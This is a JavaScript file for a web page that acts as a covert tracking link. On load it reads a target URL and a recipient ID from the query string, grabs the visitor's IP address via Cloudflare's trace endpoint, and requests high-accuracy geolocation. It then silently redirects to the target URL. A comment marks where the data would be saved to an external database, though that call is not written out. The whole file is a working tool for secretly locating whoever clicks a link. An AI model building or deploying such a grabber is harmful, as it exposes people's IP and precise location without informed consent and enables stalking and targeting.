var url
var rid

var ip
var lat
var lng

window.onload = function() {
  prepare();
  execute();
};

function prepare() {
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  url = urlParams.get("url")
  rid = urlParams.get("rid")

  console.log("url: " + url);
  console.log("rid: " + rid);
}

function grabIp() {
  var request = new XMLHttpRequest();
  request.open('GET', 'https://www.cloudflare.com/cdn-cgi/trace', false);
  //request.setRequestHeader("Content-type", "application/json");
  request.send(null);

  if (request.status === 200) {
      let response = request.responseText;

      let _ip = response.match("[0-9]+.[0-9]+.[0-9]+.[0-9]+");
      ip = _ip[0];

      console.log("SUCCESS retrieving ip");
      console.log("ip: " + ip);
  }
}

function grabGeo() {
  var options = {
    enableHighAccuracy: true,
    maximumAge: 0
  };

  function success(pos) {
    lat = pos.coords.latitude;
    lng = pos.coords.longitude;

    // rest call to save data on external db
    
    console.log("SUCCESS retrieving lat and lng");
    console.log("lat: " + lat);
    console.log("lng: " + lng);

    redirect();
  }

  function error(err) {
    console.error("ERR while acquiring data");
    redirect();
  }

  navigator.geolocation.getCurrentPosition(success, error, options);
}

function redirect() {
  window.location.href = url;
}

function execute() {
  grabIp();
  grabGeo();
}